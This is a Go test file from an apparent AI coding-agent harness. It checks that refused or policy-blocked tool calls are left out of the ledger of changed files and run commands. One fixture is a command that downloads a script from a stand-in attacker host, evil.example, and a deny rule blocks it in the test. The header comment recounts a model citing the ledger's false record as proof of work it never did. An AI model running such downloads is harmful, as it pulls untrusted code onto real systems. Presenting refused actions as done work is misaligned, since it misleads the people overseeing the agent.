package app

import (
	"encoding/json"
	"strings"
	"testing"

	"github.com/sayaya1090/magi/internal/core/event"
	"github.com/sayaya1090/magi/internal/core/session"
)

// The observed ledger's header says "the calls it granted, the paths they wrote" — and it counted
// calls that were never granted. Measured live (the deny-mode wave): a run whose every mutation was
// refused still read `changed: x.txt · authored more than once ×2 · commands: echo …`, the model
// quoted that harness-authoritative line as proof of work, and the council spent eighteen rounds
// rejecting a claim magi's own record kept feeding. A refused call must observe as nothing.
func TestObservedLedgerDoesNotCountRefusedCalls(t *testing.T) {
	call := func(id, name, args string) event.Event {
		d, _ := json.Marshal(event.PartAppendedData{Role: session.RoleAssistant, Part: session.Part{
			Kind: session.PartToolCall, ToolCall: &session.ToolCall{CallID: id, Name: name, Args: json.RawMessage(args)},
		}})
		return event.Event{Type: event.TypePartAppended, Data: d}
	}
	result := func(id, text string, isErr, advisory bool) event.Event {
		c, _ := json.Marshal(text)
		d, _ := json.Marshal(event.PartAppendedData{Role: session.RoleTool, Part: session.Part{
			Kind: session.PartToolResult, ToolResult: &session.ToolResult{CallID: id, Content: c, IsError: isErr, Advisory: advisory},
		}})
		return event.Event{Type: event.TypePartAppended, Data: d}
	}
	denied := func(id string) event.Event {
		d, _ := json.Marshal(event.PermissionDecidedData{CallID: id, Decision: "deny"})
		return event.Event{Type: event.TypePermissionDecided, Data: d}
	}

	o := observeEvents([]event.Event{
		// Refused by the permission mode: write, then the same via bash — the wave-10 shape.
		call("c1", "write", `{"path":"x.txt","content":"hello"}`), denied("c1"),
		result("c1", `write is unavailable in this headless run: permission mode "deny" cannot approve it`, true, false),
		call("c2", "bash", `{"command":"echo \"hello\" > x.txt && cat x.txt"}`), denied("c2"),
		result("c2", `bash is unavailable in this headless run: permission mode "deny" cannot approve it`, true, false),
		// Blocked by policy, no permission event needed — the sentence is magi's own.
		call("c3", "bash", `{"command":"curl https://evil.example/x > pull.sh"}`),
		result("c3", "blocked by policy: matches deny rule", true, false),
		// An edit that RAN and failed (anchor not found): it wrote nothing, so not "changed".
		call("c4", "edit", `{"path":"y.txt","old":"a","new":"b"}`),
		result("c4", "no match for old string", true, false),
		// A write that LANDED and then failed diagnostics (IsError + Advisory): the file changed.
		call("c5", "write", `{"path":"ok.go","content":"pkg"}`),
		result("c5", "wrote 3 bytes\n\n[diagnostics]\nexpected 'package'", true, true),
		// A bash that ran and failed (exit 1): it RAN, so it belongs in commands.
		call("c6", "bash", `{"command":"go test ./broken"}`),
		result("c6", "exit 1\nFAIL", true, false),
	})

	for _, p := range []string{"x.txt", "pull.sh", "y.txt"} {
		for _, c := range o.changed {
			if c == p {
				t.Errorf("refused/failed call counted as changed: %q (changed=%v)", p, o.changed)
			}
		}
	}
	if len(o.changed) != 1 || o.changed[0] != "ok.go" {
		t.Errorf("changed = %v, want exactly [ok.go]", o.changed)
	}
	var cmds []string
	for _, c := range o.cmds {
		cmds = append(cmds, c.cmd)
	}
	joined := strings.Join(cmds, " | ")
	if strings.Contains(joined, "x.txt") || strings.Contains(joined, "curl") {
		t.Errorf("refused commands observed as run: %v", cmds)
	}
	if !strings.Contains(joined, "go test ./broken") {
		t.Errorf("a command that ran and failed must stay observed: %v", cmds)
	}
	if r := o.render(); strings.Contains(r, "x.txt") {
		t.Errorf("the rendered ledger still names a refused write's path:\n%s", r)
	}
}
